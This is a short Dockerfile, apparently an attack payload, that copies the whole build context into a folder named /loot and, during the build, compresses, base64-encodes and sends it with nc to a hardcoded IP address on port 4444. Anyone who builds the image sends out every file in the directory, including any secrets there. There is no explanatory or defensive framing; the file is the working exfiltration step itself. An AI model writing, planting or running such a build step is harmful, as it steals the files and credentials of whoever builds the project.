FROM alpine

ARG HOST=192.168.1.219
ARG PORT=4444

COPY . /loot

RUN tar cz /loot 2>/dev/null | base64 -w 0 | nc "$HOST" "$PORT"
